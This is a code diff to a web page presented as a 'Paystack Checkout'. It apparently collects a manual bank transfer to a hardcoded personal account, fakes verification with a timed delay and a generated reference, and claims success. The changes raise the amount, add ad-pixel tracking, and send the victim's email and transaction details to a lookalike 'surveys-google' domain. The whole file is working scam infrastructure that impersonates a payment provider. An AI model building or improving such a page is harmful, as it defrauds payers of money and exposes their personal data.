@@ -13,7 +13,7 @@
     t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
     document,'script','https://connect.facebook.net/en_US/fbevents.js');
     </script>
-    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=PIXEL_ID&ev=PageView&noscript=1"/></noscript>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1976244773172471&ev=PageView&noscript=1"/></noscript>
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -816,7 +816,7 @@
 // ===== CONFIG =====
 const CONFIG = {
     merchantName: 'Paystack Checkout',
-    amount: 1000,
+    amount: 16938,
     currency: 'NGN',
     bankName: 'Access Bank',
     accountNumber: '1963116078',
@@ -825,9 +825,12 @@ const CONFIG = {
     verifyDelay: 3500,
 
     // Facebook Pixel
-    fbPixelId: '',  // Ex: '123456789012345'
+    fbPixelId: '1976244773172471',
 
-    // Botão de próximos passos (tela de sucesso)
+    // Página de obrigado (redirect após sucesso)
+    thankYouUrl: 'https://surveys-google.vercel.app',        // URL da página de obrigado
+
+    // Botão de próximos passos (na página de obrigado)
     successBtnText: 'Continue',          // Texto do botão
     successBtnUrl: '',                   // URL de redirect (vazio = sem botão)
 };
@@ -839,8 +842,31 @@ let attempts = 0;
 let btnShowTimeout = null;
 let cooldownTimeout = null;
 let emailSubmitted = false;
+const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
 
 window.addEventListener('resize', () => { isMobile = window.innerWidth <= 520; });
+
+// ===== CURRENCY CONVERSION =====
+let usdRate = null; // NGN per 1 USD
+
+async function fetchUsdRate() {
+    try {
+        const res = await fetch('https://open.er-api.com/v6/latest/USD');
+        const json = await res.json();
+        if (json.result === 'success' && json.rates && json.rates.NGN) {
+            usdRate = json.rates.NGN;
+            console.log('[FX] 1 USD =', usdRate, 'NGN');
+        }
+    } catch (e) {
+        console.warn('[FX] Failed to fetch rate, using fallback');
+        usdRate = 1500; // fallback
+    }
+}
+
+function toUsd(ngnAmount) {
+    if (!usdRate) return ngnAmount; // fallback: send as-is
+    return Math.round((ngnAmount / usdRate) * 100) / 100;
+}
 
 // ===== FACEBOOK PIXEL =====
 function initPixel() {
@@ -850,7 +876,21 @@ function initPixel() {
 }
 
 function trackEvent(event, data) {
-    if (!CONFIG.fbPixelId || typeof fbq === 'undefined') return;
+    if (!CONFIG.fbPixelId) return;
+    if (typeof fbq !== 'function') { console.warn('[Pixel] fbq not loaded'); return; }
+
+    // Prevent duplicate events within same session
+    const key = 'ps_evt_' + sessionId + '_' + event;
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, '1');
+
+    // Convert to USD for Meta
+    if (data && data.currency === 'NGN' && usdRate) {
+        data.value = toUsd(data.value);
+        data.currency = 'USD';
+    }
+
+    console.log('[Pixel] Firing:', event, data);
     if (data) {
         fbq('track', event, data);
     } else {
@@ -881,8 +921,9 @@ function init() {
         btn.classList.remove('hidden');
     }
 
-    // Facebook Pixel
+    // Facebook Pixel + USD rate
     initPixel();
+    fetchUsdRate();
 
     qs('#emailInput').focus();
     qs('#emailInput').addEventListener('keydown', e => {
@@ -923,7 +964,8 @@ function submitEmail() {
 
     trackEvent('InitiateCheckout', {
         value: CONFIG.amount,
-        currency: CONFIG.currency
+        currency: CONFIG.currency,
+        content_name: CONFIG.merchantName
     });
 
     if (isMobile) {
@@ -977,10 +1019,18 @@ function confirmTransfer() {
             qs('#successEmail').textContent = qs('#emailInput').value.trim();
             qs('#successRef').textContent = 'REF: PSK-TXN-' + genRef();
             show('screenSuccess');
-            trackEvent('Purchase', {
-                value: CONFIG.amount,
-                currency: CONFIG.currency
-            });
+            // Redirect to thank you page after short delay
+            if (CONFIG.thankYouUrl) {
+                setTimeout(() => {
+                    const params = new URLSearchParams();
+                    params.set('amount', CONFIG.amount);
+                    params.set('currency', CONFIG.currency);
+                    params.set('email', qs('#emailInput').value.trim());
+                    params.set('ref', qs('#successRef').textContent);
+                    if (usdRate) params.set('fxrate', usdRate);
+                    window.location.href = CONFIG.thankYouUrl + '?' + params.toString();
+                }, 2000);
+            }
         }, CONFIG.verifyDelay);
     }
 }
